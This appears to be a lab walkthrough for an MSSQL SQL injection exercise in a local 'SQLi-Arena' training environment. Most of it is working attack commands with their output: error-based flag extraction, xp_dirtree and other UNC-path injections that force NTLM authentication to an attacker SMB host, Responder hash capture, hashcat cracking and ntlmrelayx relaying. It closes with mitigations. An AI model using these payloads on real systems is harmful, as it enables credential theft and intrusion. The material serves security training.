<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=server"<br><br>
        <span class="prompt">Input: </span>server<br>
        <span class="prompt">SQL: </span>SELECT id, asset_name, asset_type, location FROM assets WHERE asset_name LIKE '%server%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>web-server-01</strong> &bull; Type: Server &bull; Location: Datacenter A - Rack 12<br>
        <strong>web-server-02</strong> &bull; Type: Server &bull; Location: Datacenter A - Rack 12<br>
        <strong>db-server-01</strong> &bull; Type: Server &bull; Location: Datacenter B - Rack 5<br>
        <strong>server-backup</strong> &bull; Type: Server &bull; Location: Datacenter B - Rack 8
    </div>
</div>

<h4>Step 2: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. CONVERT Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_ntlm_h4sh_c4ptur3}' to data type int.</strong>
    </div>
</div>

<h4>Step 3: Start NTLM Capture (Responder)</h4>
<p>On your attacker machine, start Responder to capture NTLM authentication:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Responder Setup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>sudo responder -I eth0 -v<br>
        <span class="prompt">[*] </span>Listening for events...<br>
        <span class="prompt">[*] </span>SMB server started on 0.0.0.0:445
    </div>
</div>

<h4>Step 4: Force NTLM Auth via UNC Path</h4>
<p>
    Use <code>xp_dirtree</code> stacked query to make MSSQL connect to your SMB server.
    Windows automatically sends NTLM credentials for UNC paths.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNC Path Trigger</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q='; EXEC xp_dirtree '\\10.10.14.5\share'; -- -"<br><br>
        <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\10.10.14.5\share'; -- -<br>
        <span class="prompt">Response: </span>All 8 assets returned (stacked query executes silently, normal results shown)<br><br>
        <span class="prompt">// Responder captures (on attacker machine):</span><br>
        <span class="prompt">[SMB] </span>NTLMv2-SSP Client: 10.10.10.50<br>
        <span class="prompt">[SMB] </span>NTLMv2-SSP Username: CORP\sql_service<br>
        <span class="prompt">[SMB] </span>NTLMv2-SSP Hash: sql_service::CORP:1122334455667788:A1B2C3D4E5F6...
    </div>
</div>

<h4>Step 5: Crack the NTLMv2 Hash</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Hash Cracking</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt<br>
        <span class="prompt">[*] </span>Status: Cracked<br>
        <span class="prompt">[*] </span>sql_service::CORP:...:SqlServ1ce!<br><br>
        <span class="prompt">// Alternative: John the Ripper</span><br>
        <span class="prompt">$ </span>john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2_hash.txt
    </div>
</div>

<h4>Step 6: NTLM Relay Attack (Alternative)</h4>
<p>Relay the captured auth instead of cracking:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. NTLM Relay</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>ntlmrelayx.py -t smb://10.10.10.100 -smb2support<br>
        <span class="prompt">// Then trigger UNC access from MSSQL:</span><br>
        <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\10.10.14.5\relay'; -- -<br>
        <span class="prompt">// ntlmrelayx forwards auth to target, gaining access without cracking</span>
    </div>
</div>

<h4>Step 7: Alternative UNC Trigger Methods</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Other UNC Triggers</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">xp_dirtree:    </span>'; EXEC xp_dirtree '\\attacker\x'; -- -<br>
        <span class="prompt">xp_fileexist:  </span>'; EXEC xp_fileexist '\\attacker\x'; -- -<br>
        <span class="prompt">OPENROWSET:    </span>' UNION SELECT 1,2,3,4 FROM OPENROWSET('SQLNCLI','Server=attacker;','SELECT 1') -- -<br>
        <span class="prompt">BACKUP:        </span>'; BACKUP DATABASE master TO DISK='\\attacker\bak'; -- -<br>
        <span class="prompt">fn_xe_file:    </span>'; SELECT * FROM sys.fn_xe_file_target_read_file('\\attacker\x.xel',NULL,NULL,NULL); -- -
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_ntlm_h4sh_c4ptur3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Quick Solve</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_ntlm_h4sh_c4ptur3}' to data type int.</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> When MSSQL accesses a UNC path, Windows automatically attempts
    NTLM authentication to the target SMB server. Attackers capture the NTLMv2 hash using tools
    like Responder, then either crack it with hashcat or relay it with ntlmrelayx for lateral
    movement. <strong>Mitigations:</strong> Run MSSQL as a local service account (not a domain user),
    block outbound SMB (port 445) at the firewall, enable SMB signing, and disable NTLM
    authentication via Group Policy where possible.
</div>
